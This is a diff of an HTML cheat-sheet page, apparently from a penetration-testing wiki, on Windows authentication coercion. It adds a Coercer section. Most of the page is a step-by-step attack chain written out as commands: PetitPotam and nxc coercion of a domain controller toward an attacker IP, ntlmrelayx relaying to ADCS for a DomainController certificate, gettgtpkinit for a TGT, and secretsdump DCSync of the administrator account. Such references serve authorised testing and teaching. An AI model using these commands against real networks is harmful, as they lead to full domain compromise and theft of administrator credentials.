@@ -100,7 +100,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#petitpotam-ms-efsrpc" class="md-skip">
+        <a href="#multi-method" class="md-skip">
           Skip to content
         </a>
       
@@ -3789,6 +3789,15 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#multi-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      Multi-Method
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#petitpotam-ms-efsrpc" class="md-nav__link">
     <span class="md-ellipsis">
       PetitPotam (MS-EFSRPC)
@@ -5200,6 +5209,15 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#multi-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      Multi-Method
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#petitpotam-ms-efsrpc" class="md-nav__link">
     <span class="md-ellipsis">
       PetitPotam (MS-EFSRPC)
@@ -5272,6 +5290,11 @@
   <h1>Authentication Coercion</h1>
 
 <hr />
+<h2 id="multi-method">Multi-Method</h2>
+<hr />
+<p><strong>Coercer will attempt 12 different methods to coerce authentication: (<a href="https://github.com/p0dalirius/Coercer">coercer</a>)</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>python3<span class="w"> </span>coercer.py<span class="w"> </span>coerce<span class="w"> </span>-l<span class="w"> </span>&lt;attackerIP&gt;<span class="w"> </span>-t<span class="w"> </span>&lt;targetIP&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>&lt;domain.local&gt;<span class="w"> </span>-v
+</span></code></pre></div>
 <h2 id="petitpotam-ms-efsrpc">PetitPotam (MS-EFSRPC)</h2>
 <hr />
 <h3 id="attack-requirements">Attack requirements</h3>
@@ -5318,10 +5341,10 @@
 </table>
 <h3 id="identify">Identify</h3>
 <hr />
-<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">METHOD</span><span class="o">=</span>PetitPotam
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">METHOD</span><span class="o">=</span>PetitPotam
 </span></code></pre></div>
 shorthand
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">M</span><span class="o">=</span>pe
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">M</span><span class="o">=</span>pe
 </span></code></pre></div></p>
 <h3 id="exploit">Exploit</h3>
 <hr />
@@ -5329,24 +5352,24 @@ shorthand
 <a href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1">https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1</a>  </p>
 <h3 id="start-ntlmrelayx">Start ntlmrelayx</h3>
 <hr />
-<p><div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">sudo</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-debug</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-target</span> <span class="n">http</span><span class="p">://</span><span class="n">CA01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">DomainController</span>
+<p><div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">sudo</span> <span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-debug</span> <span class="n">-smb2support</span> <span class="p">-</span><span class="n">-target</span> <span class="n">http</span><span class="p">://</span><span class="n">CA01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">certsrv</span><span class="p">/</span><span class="n">certfnsh</span><span class="p">.</span><span class="n">asp</span> <span class="p">-</span><span class="n">-adcs</span> <span class="p">-</span><span class="n">-template</span> <span class="n">DomainController</span>
 </span></code></pre></div>
 At the same time try to coerce DC to auth
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">python3</span> <span class="n">PetitPotam</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">attackerIP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">DCIP</span><span class="p">&gt;</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">python3</span> <span class="n">PetitPotam</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">attackerIP</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">DCIP</span><span class="p">&gt;</span>
 </span></code></pre></div>
 OR coerce with nxc
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">LISTENER</span><span class="o">=</span>&lt;AttackerIP&gt;<span class="w"> </span><span class="nv">M</span><span class="o">=</span>pe
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-M<span class="w"> </span>coerce_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">LISTENER</span><span class="o">=</span>&lt;AttackerIP&gt;<span class="w"> </span><span class="nv">M</span><span class="o">=</span>pe
 </span></code></pre></div></p>
 <p>You should receive a base64 encoded certificate in ntlmrelayx output
 Next, we can take this base64 certificate and use <code>gettgtpkinit.py</code> to request a Ticket-Granting-Ticket (TGT) for the domain controller.
 <a href="https://github.com/dirkjanm/PKINITtools.git">https://github.com/dirkjanm/PKINITtools.git</a>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">python3</span> <span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">DC01</span><span class="p">\$</span> <span class="n">-pfx-base64</span> <span class="n">MIIStQIBAzCCEn8GCSqGSI</span><span class="p">...</span><span class="n">SNIP</span><span class="p">...</span><span class="n">CKBdGmY</span><span class="p">=</span> <span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">python3</span> <span class="n">gettgtpkinit</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">/</span><span class="n">DC01</span><span class="p">\$</span> <span class="n">-pfx-base64</span> <span class="n">MIIStQIBAzCCEn8GCSqGSI</span><span class="p">...</span><span class="n">SNIP</span><span class="p">...</span><span class="n">CKBdGmY</span><span class="p">=</span> <span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
 </span></code></pre></div>
 Set krb env variable
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">dc01</span><span class="p">.</span><span class="n">ccache</span>
 </span></code></pre></div>
 Attempt DCSync
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">impacket-secretsdump</span> <span class="n">-just-dc-user</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">administrator</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="s2">&quot;DC01$&quot;</span><span class="nv">@DC01</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">impacket-secretsdump</span> <span class="n">-just-dc-user</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">administrator</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="s2">&quot;DC01$&quot;</span><span class="nv">@DC01</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span>
 </span></code></pre></div></p>
 
 
